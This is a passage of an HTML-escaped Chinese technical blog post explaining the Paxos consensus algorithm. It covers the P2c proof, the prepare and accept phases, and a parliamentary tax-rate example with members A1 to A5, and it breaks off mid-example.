w&#x3002;&#x7531;&#x4E8E;S1&#x548C;&#x901A;&#x8FC7;&#x63D0;&#x6848;m&#x65F6;&#x7684;&#x591A;&#x6570;&#x6D3E;C&#x4E4B;&#x95F4;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x6240;&#x4EE5;&#x4EE5;&#x4E0A;&#x4E24;&#x4E2A;&#x6761;&#x4EF6;&#x90FD;&#x4E0D;&#x6210;&#x7ACB;&#xFF0C;&#x5BFC;&#x51FA;&#x77DB;&#x76FE;&#x4ECE;&#x800C;&#x63A8;&#x7FFB;&#x5047;&#x8BBE;&#xFF0C;&#x8BC1;&#x660E;&#x4E86;&#x63D0;&#x6848;n&#x5FC5;&#x987B;&#x5177;&#x6709;value v&#xFF1B;</p>\n<p>&#x82E5;&#xFF08;m+1&#xFF09;..&#xFF08;N-1&#xFF09;&#x6240;&#x6709;&#x63D0;&#x6848;&#x90FD;&#x5177;&#x6709;value v&#xFF0C;&#x91C7;&#x7528;&#x53CD;&#x8BC1;&#x6CD5;&#xFF0C;&#x5047;&#x5982;&#x65B0;&#x63D0;&#x6848;N&#x4E0D;&#x5177;&#x6709;value v&#xFF0C;&#x800C;&#x662F;&#x5177;&#x6709;value w&#x2019;,&#x6839;&#x636E;P2c&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;S2&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x6CA1;&#x6709;&#x63A5;&#x53D7;&#x8FC7;m..&#xFF08;N-1&#xFF09;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x4E48;&#x4ED6;&#x4EEC;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;N&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x662F;value w&#x2019;&#x3002;&#x7531;&#x4E8E;S2&#x548C;&#x901A;&#x8FC7;m&#x7684;&#x591A;&#x6570;&#x6D3E;C&#x4E4B;&#x95F4;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x5171;&#x7684;acceptor&#xFF0C;&#x6240;&#x4EE5;&#x81F3;&#x5C11;&#x6709;&#x4E00;&#x4E2A;acceptor&#x66FE;&#x7ECF;&#x63A5;&#x53D7;&#x4E86;m&#xFF0C;&#x4ECE;&#x800C;&#x4E5F;&#x53EF;&#x4EE5;&#x63A8;&#x51FA;S2&#x4E2D;&#x5DF2;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x7684;&#x7F16;&#x53F7;&#x8303;&#x56F4;&#x5728;m..&#xFF08;N-1&#xFF09;&#x4E4B;&#x95F4;&#xFF0C;&#x800C;&#x6839;&#x636E;&#x521D;&#x59CB;&#x5047;&#x8BBE;&#xFF0C;m..&#xFF08;N-1&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x6240;&#x6709;&#x63D0;&#x6848;&#x90FD;&#x5177;&#x6709;value v&#xFF0C;&#x6240;&#x4EE5;S2&#x4E2D;&#x5DF2;&#x63A5;&#x53D7;&#x7684;&#x6240;&#x6709;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x4E2D;&#x7F16;&#x53F7;&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;&#x63D0;&#x6848;&#x80AF;&#x5B9A;&#x5177;&#x6709;value v&#xFF0C;&#x5BFC;&#x51FA;&#x77DB;&#x76FE;&#x4ECE;&#x800C;&#x63A8;&#x7FFB;&#x65B0;&#x63D0;&#x6848;n&#x4E0D;&#x5177;&#x6709;value v&#x7684;&#x5047;&#x8BBE;&#x3002;&#x6839;&#x636E;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x8BC1;&#x660E;&#x4E86;&#x82E5;&#x6EE1;&#x8DB3;P2c&#xFF0C;&#x5219;P2b&#x4E00;&#x5B9A;&#x6EE1;&#x8DB3;&#x3002;</p>\n<p>P2c&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x6A21;&#x578B;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5F15;&#x5165;&#x4E86;P2c&#x540E;&#xFF0C;&#x4E5F;&#x89E3;&#x51B3;&#x4E86;&#x524D;&#x6587;&#x63D0;&#x5230;&#x7684;P1&#x4E0D;&#x5B8C;&#x5907;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<h3 id=\"&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;\"><a href=\"#&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;\"></a>&#x7B97;&#x6CD5;&#x7684;&#x5185;&#x5BB9;</h3><p>&#x8981;&#x6EE1;&#x8DB3;P2c&#x7684;&#x7EA6;&#x675F;&#xFF0C;proposer&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x524D;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x548C;&#x8DB3;&#x4EE5;&#x5F62;&#x6210;&#x591A;&#x6570;&#x6D3E;&#x7684;acceptors&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#xFF0C;&#x83B7;&#x5F97;&#x4ED6;&#x4EEC;&#x8FDB;&#x884C;&#x7684;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7684;&#x63D0;&#x6848;&#xFF08;prepare&#x8FC7;&#x7A0B;&#xFF09;&#xFF0C;&#x4E4B;&#x540E;&#x6839;&#x636E;&#x56DE;&#x6536;&#x7684;&#x4FE1;&#x606F;&#x51B3;&#x5B9A;&#x8FD9;&#x6B21;&#x63D0;&#x6848;&#x7684;value&#xFF0C;&#x5F62;&#x6210;&#x63D0;&#x6848;&#x5F00;&#x59CB;&#x6295;&#x7968;&#x3002;&#x5F53;&#x83B7;&#x5F97;&#x591A;&#x6570;acceptors&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x540E;&#xFF0C;&#x63D0;&#x6848;&#x83B7;&#x5F97;&#x6279;&#x51C6;&#xFF08;chosen&#xFF09;&#xFF0C;&#x7531;proposer&#x5C06;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x544A;&#x77E5;learner&#x3002;&#x8FD9;&#x4E2A;&#x7B80;&#x7565;&#x7684;&#x8FC7;&#x7A0B;&#x7ECF;&#x8FC7;&#x8FDB;&#x4E00;&#x6B65;&#x7EC6;&#x5316;&#x540E;&#x5C31;&#x5F62;&#x6210;&#x4E86;Paxos&#x7B97;&#x6CD5;&#x3002;</p>\n<p>&#x5728;&#x4E00;&#x4E2A;paxos&#x5B9E;&#x4F8B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E2A;&#x63D0;&#x6848;&#x9700;&#x8981;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x4E14;&#x7F16;&#x53F7;&#x95F4;&#x8981;&#x5B58;&#x5728;&#x5168;&#x5E8F;&#x5173;&#x7CFB;&#x3002;&#x53EF;&#x4EE5;&#x7528;&#x591A;&#x79CD;&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x4F8B;&#x5982;&#x5C06;&#x5E8F;&#x6570;&#x548C;proposer&#x7684;&#x540D;&#x5B57;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x3002;&#x5982;&#x4F55;&#x505A;&#x5230;&#x8FD9;&#x4E00;&#x70B9;&#x4E0D;&#x5728;Paxos&#x7B97;&#x6CD5;&#x8BA8;&#x8BBA;&#x7684;&#x8303;&#x56F4;&#x4E4B;&#x5185;&#x3002;</p>\n<p>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;chosen&#x8FC7;&#x4EFB;&#x4F55;proposer&#x63D0;&#x6848;&#x7684;acceptor&#x5728;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#x56DE;&#x7B54;&#x4E86;&#x4E00;&#x4E2A;proposer&#x9488;&#x5BF9;&#x63D0;&#x6848;n&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5F00;&#x59CB;&#x5BF9;n&#x8FDB;&#x884C;&#x6295;&#x7968;&#x524D;&#xFF0C;&#x53C8;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x4E86;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF08;&#x4F8B;&#x5982;n-1&#xFF09;&#xFF0C;&#x5982;&#x679C;n-1&#x548C;n&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7684;value&#xFF0C;&#x8FD9;&#x4E2A;&#x6295;&#x7968;&#x5C31;&#x4F1A;&#x8FDD;&#x80CC;P2c&#x3002;&#x56E0;&#x6B64;&#x5728;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;acceptor&#x8FDB;&#x884C;&#x7684;&#x56DE;&#x7B54;&#x540C;&#x65F6;&#x4E5F;&#x5E94;&#x5305;&#x542B;&#x627F;&#x8BFA;&#xFF1A;&#x4E0D;&#x4F1A;&#x518D;&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x662F;&#x5BF9;P1&#x7684;&#x52A0;&#x5F3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">P1a&#xFF1A;&#x5F53;&#x4E14;&#x4EC5;&#x5F53;acceptor&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x8FC7;&#x7F16;&#x53F7;&#x5927;&#x4E8E;n&#x7684;prepare&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;acceptor&#x63A5;&#x53D7;&#xFF08;accept&#xFF09;&#x7F16;&#x53F7;&#x4E3A;n&#x7684;&#x63D0;&#x6848;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x63D0;&#x51FA;&#x5B8C;&#x6574;&#x7684;&#x7B97;&#x6CD5;&#x4E86;&#x3002;</p>\n<h4 id=\"&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;\"><a href=\"#&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;\" class=\"headerlink\" title=\"&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;\"></a>&#x51B3;&#x8BAE;&#x7684;&#x63D0;&#x51FA;&#x4E0E;&#x6279;&#x51C6;</h4><p>&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x51B3;&#x8BAE;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#xFF1A;</p>\n<ul>\n<li>prepare&#x9636;&#x6BB5;&#xFF1A;<ul>\n<li>proposer&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x7F16;&#x53F7;n&#x5E76;&#x5C06;prepare&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x7ED9;acceptors&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF1B;</li>\n<li>acceptor&#x6536;&#x5230;prepare&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x63D0;&#x6848;&#x7684;&#x7F16;&#x53F7;&#x5927;&#x4E8E;&#x5B83;&#x5DF2;&#x7ECF;&#x56DE;&#x590D;&#x7684;&#x6240;&#x6709;prepare&#x6D88;&#x606F;&#xFF0C;&#x5219;acceptor&#x5C06;&#x81EA;&#x5DF1;&#x4E0A;&#x6B21;&#x63A5;&#x53D7;&#x7684;&#x63D0;&#x6848;&#x56DE;&#x590D;&#x7ED9;proposer&#xFF0C;&#x5E76;&#x627F;&#x8BFA;&#x4E0D;&#x518D;&#x56DE;&#x590D;&#x5C0F;&#x4E8E;n&#x7684;&#x63D0;&#x6848;&#xFF1B;</li>\n</ul>\n</li>\n<li>&#x6279;&#x51C6;&#x9636;&#x6BB5;&#xFF1A;<ul>\n<li>&#x5F53;&#x4E00;&#x4E2A;proposer&#x6536;&#x5230;&#x4E86;&#x591A;&#x6570;acceptors&#x5BF9;prepare&#x7684;&#x56DE;&#x590D;&#x540E;&#xFF0C;&#x5C31;&#x8FDB;&#x5165;&#x6279;&#x51C6;&#x9636;&#x6BB5;&#x3002;&#x5B83;&#x8981;&#x5411;&#x56DE;&#x590D;prepare&#x8BF7;&#x6C42;&#x7684;acceptors&#x53D1;&#x9001;accept&#x8BF7;&#x6C42;&#xFF0C;&#x5305;&#x62EC;&#x7F16;&#x53F7;n&#x548C;&#x6839;&#x636E;P2c&#x51B3;&#x5B9A;&#x7684;value&#xFF08;&#x5982;&#x679C;&#x6839;&#x636E;P2c&#x6CA1;&#x6709;&#x5DF2;&#x7ECF;&#x63A5;&#x53D7;&#x7684;value&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x51B3;&#x5B9A;value&#xFF09;&#x3002;</li>\n<li>&#x5728;&#x4E0D;&#x8FDD;&#x80CC;&#x81EA;&#x5DF1;&#x5411;&#x5176;&#x4ED6;proposer&#x7684;&#x627F;&#x8BFA;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;acceptor&#x6536;&#x5230;accept&#x8BF7;&#x6C42;&#x540E;&#x5373;&#x63A5;&#x53D7;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x3002;</li>\n</ul>\n</li>\n</ul>\n<p>&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x4E2D;&#x65AD;&#x90FD;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x6B63;&#x786E;&#x6027;&#x3002;&#x4F8B;&#x5982;&#x5982;&#x679C;&#x4E00;&#x4E2A;proposer&#x53D1;&#x73B0;&#x5DF2;&#x7ECF;&#x6709;&#x5176;&#x4ED6;proposers&#x63D0;&#x51FA;&#x4E86;&#x7F16;&#x53F7;&#x66F4;&#x9AD8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5219;&#x6709;&#x5FC5;&#x8981;&#x4E2D;&#x65AD;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x3002;&#x56E0;&#x6B64;&#x4E3A;&#x4E86;&#x4F18;&#x5316;&#xFF0C;&#x5728;&#x4E0A;&#x8FF0;prepare&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;acceptor&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x66F4;&#x9AD8;&#x7F16;&#x53F7;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x901A;&#x77E5;proposer&#xFF0C;&#x63D0;&#x9192;&#x5176;&#x4E2D;&#x65AD;&#x8FD9;&#x6B21;&#x63D0;&#x6848;&#x3002;</p>\n<h4 id=\"&#x5B9E;&#x4F8B;\"><a href=\"#&#x5B9E;&#x4F8B;\" class=\"headerlink\" title=\"&#x5B9E;&#x4F8B;\"></a>&#x5B9E;&#x4F8B;</h4><p>&#x7528;&#x5B9E;&#x9645;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x66F4;&#x6E05;&#x6670;&#x5730;&#x63CF;&#x8FF0;&#x4E0A;&#x8FF0;&#x8FC7;&#x7A0B;&#xFF1A;<br>&#x6709;A1, A2, A3, A4, A5 5&#x4F4D;&#x8BAE;&#x5458;&#xFF0C;&#x5C31;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x8FDB;&#x884C;&#x51B3;&#x8BAE;&#x3002;&#x8BAE;&#x5458;A1&#x51B3;&#x5B9A;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%,&#x56E0;&#x6B64;&#x5B83;&#x5411;&#x6240;&#x6709;&#x4EBA;&#x53D1;&#x51FA;&#x4E00;&#x4E2A;&#x8349;&#x6848;&#x3002;&#x8FD9;&#x4E2A;&#x8349;&#x6848;&#x7684;&#x5185;&#x5BB9;&#x662F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;10%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A1</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6CA1;&#x6709;&#x4EBA;&#x4E0E;&#x5176;&#x7ADE;&#x4E89;;&#x4FE1;&#x606F;&#x80FD;&#x53CA;&#x65F6;&#x987A;&#x5229;&#x5730;&#x4F20;&#x8FBE;&#x5230;&#x5176;&#x5B83;&#x8BAE;&#x5458;&#x5904;&#x3002;<br>&#x4E8E;&#x662F;, A2-A5&#x56DE;&#x5E94;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x4F60;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;</span><br></pre></td></tr></table></figure></p>\n<p>&#x800C;A1&#x5728;&#x6536;&#x5230;2&#x4EFD;&#x56DE;&#x590D;&#x540E;&#x5C31;&#x53D1;&#x5E03;&#x6700;&#x7EC8;&#x51B3;&#x8BAE;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x9000;&#x5316;&#x4E3A;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x3002;<br>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x5728;A1&#x63D0;&#x51FA;&#x63D0;&#x6848;&#x7684;&#x540C;&#x65F6;, A5&#x51B3;&#x5B9A;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;20%:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;20%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A5</span><br></pre></td></tr></table></figure></p>\n<p>&#x8349;&#x6848;&#x8981;&#x901A;&#x8FC7;&#x4F8D;&#x4ECE;&#x9001;&#x5230;&#x5176;&#x5B83;&#x8BAE;&#x5458;&#x7684;&#x6848;&#x5934;. A1&#x7684;&#x8349;&#x6848;&#x5C06;&#x7531;4&#x4F4D;&#x4F8D;&#x4ECE;&#x9001;&#x5230;A2-A5&#x90A3;&#x91CC;&#x3002;&#x73B0;&#x5728;&#xFF0C;&#x8D1F;&#x8D23;A2&#x548C;A3&#x7684;&#x4F8D;&#x4ECE;&#x5C06;&#x8349;&#x6848;&#x987A;&#x5229;&#x9001;&#x8FBE;&#xFF0C;&#x8D1F;&#x8D23;A4&#x548C;A5&#x7684;&#x4F8D;&#x4ECE;&#x5219;&#x4E0D;&#x4E0A;&#x73ED;. A5&#x7684;&#x8349;&#x6848;&#x5219;&#x987A;&#x5229;&#x7684;&#x9001;&#x81F3;A3&#x548C;A4&#x624B;&#x4E2D;&#x3002;</p>\n<p>&#x73B0;&#x5728;, A1, A2, A3&#x6536;&#x5230;&#x4E86;A1&#x7684;&#x63D0;&#x6848;; A3, A4, A5&#x6536;&#x5230;&#x4E86;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x6309;&#x7167;&#x534F;&#x8BAE;, A1, A2, A4, A5&#x5C06;&#x63A5;&#x53D7;&#x4ED6;&#x4EEC;&#x6536;&#x5230;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x4F8D;&#x4ECE;&#x5C06;&#x62FF;&#x7740;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x6211;&#x5DF2;&#x6536;&#x5230;&#x4F60;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;</span><br></pre></td></tr></table></figure></p>\n<p>&#x7684;&#x56DE;&#x590D;&#x56DE;&#x5230;&#x63D0;&#x6848;&#x8005;&#x90A3;&#x91CC;&#x3002;<br>&#x800C;A3&#x7684;&#x884C;&#x4E3A;&#x5C06;&#x51B3;&#x5B9A;&#x6279;&#x51C6;&#x54EA;&#x4E00;&#x4E2A;&#x3002;</p>\n<h5 id=\"&#x60C5;&#x51B5;&#x4E00;\"><a href=\"#&#x60C5;&#x51B5;&#x4E00;\" class=\"headerlink\" title=\"&#x60C5;&#x51B5;&#x4E00;\"></a>&#x60C5;&#x51B5;&#x4E00;</h5><p>&#x5047;&#x8BBE;A1&#x7684;&#x63D0;&#x6848;&#x5148;&#x9001;&#x5230;A3&#x5904;&#xFF0C;&#x800C;A5&#x7684;&#x4F8D;&#x4ECE;&#x51B3;&#x5B9A;&#x653E;&#x5047;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x3002;&#x4E8E;&#x662F;A3&#x63A5;&#x53D7;&#x5E76;&#x6D3E;&#x51FA;&#x4E86;&#x4F8D;&#x4ECE;. A1&#x7B49;&#x5230;&#x4E86;&#x4E24;&#x4F4D;&#x4F8D;&#x4ECE;&#xFF0C;&#x52A0;&#x4E0A;&#x5B83;&#x81EA;&#x5DF1;&#x5DF2;&#x7ECF;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x4E8E;&#x662F;&#x7A0E;&#x7387;10%&#x5C06;&#x6210;&#x4E3A;&#x51B3;&#x8BAE;. A1&#x6D3E;&#x51FA;&#x4F8D;&#x4ECE;&#x5C06;&#x51B3;&#x8BAE;&#x9001;&#x5230;&#x6240;&#x6709;&#x8BAE;&#x5458;&#x5904;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>A3&#x5728;&#x5F88;&#x4E45;&#x4EE5;&#x540E;&#x6536;&#x5230;&#x4E86;&#x6765;&#x81EA;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x7531;&#x4E8E;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x5DF2;&#x7ECF;&#x8BA8;&#x8BBA;&#x5B8C;&#x6BD5;&#xFF0C;&#x4ED6;&#x51B3;&#x5B9A;&#x4E0D;&#x518D;&#x7406;&#x4F1A;&#x3002;&#x4F46;&#x662F;&#x4ED6;&#x8981;&#x62B1;&#x6028;&#x4E00;&#x53E5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x7A0E;&#x7387;&#x5DF2;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x6295;&#x7968;&#x4E2D;&#x5B9A;&#x4E3A;10%,&#x4F60;&#x4E0D;&#x8981;&#x518D;&#x6765;&#x70E6;&#x6211;!</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x4E2A;&#x56DE;&#x590D;&#x5BF9;A5&#x53EF;&#x80FD;&#x6709;&#x5E2E;&#x52A9;&#xFF0C;&#x56E0;&#x4E3A;A5&#x53EF;&#x80FD;&#x56E0;&#x4E3A;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#x5F88;&#x4E45;&#x65E0;&#x6CD5;&#x4E0E;&#x4E0E;&#x5916;&#x754C;&#x8054;&#x7CFB;&#x4E86;&#x3002;&#x5F53;&#x7136;&#x66F4;&#x53EF;&#x80FD;&#x5BF9;A5&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4F5C;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;A5&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x4ECE;A1&#x5904;&#x83B7;&#x5F97;&#x4E86;&#x521A;&#x624D;&#x7684;&#x51B3;&#x8BAE;&#x3002;</p>\n<h5 id=\"&#x60C5;&#x51B5;&#x4E8C;\"><a href=\"#&#x60C5;&#x51B5;&#x4E8C;\" class=\"headerlink\" title=\"&#x60C5;&#x51B5;&#x4E8C;\"></a>&#x60C5;&#x51B5;&#x4E8C;</h5><p>&#x4F9D;&#x7136;&#x5047;&#x8BBE;A1&#x7684;&#x63D0;&#x6848;&#x5148;&#x9001;&#x5230;A3&#x5904;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;A5&#x7684;&#x4F8D;&#x4ECE;&#x4E0D;&#x662F;&#x653E;&#x5047;&#x4E86;&#xFF0C;&#x53EA;&#x662F;&#x4E2D;&#x9014;&#x803D;&#x6401;&#x4E86;&#x4E00;&#x4F1A;&#x3002;&#x8FD9;&#x6B21;, A3&#x4F9D;&#x7136;&#x4F1A;&#x5C06;&#x201D;&#x63A5;&#x53D7;&#x201D;&#x56DE;&#x590D;&#x7ED9;A1.&#x4F46;&#x662F;&#x5728;&#x51B3;&#x8BAE;&#x6210;&#x578B;&#x4E4B;&#x524D;&#x5B83;&#x53C8;&#x6536;&#x5230;&#x4E86;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x65F6;&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#xFF1A;<br>1.&#x5982;&#x679C;A5&#x7684;&#x63D0;&#x6848;&#x66F4;&#x65E9;&#xFF0C;&#x6309;&#x7167;&#x4F20;&#x7EDF;&#x5E94;&#x8BE5;&#x7531;&#x8F83;&#x65E9;&#x7684;&#x63D0;&#x6848;&#x8005;&#x4E3B;&#x6301;&#x6295;&#x7968;&#x3002;&#x73B0;&#x5728;&#x770B;&#x6765;&#x4E24;&#x4EFD;&#x63D0;&#x6848;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x6837;&#xFF08;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;&#xFF09;&#x3002;&#x4F46;&#x662F;A5&#x662F;&#x4E2A;&#x60F9;&#x4E0D;&#x8D77;&#x7684;&#x5927;&#x4EBA;&#x7269;&#x3002;&#x4E8E;&#x662F;A3&#x56DE;&#x590D;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 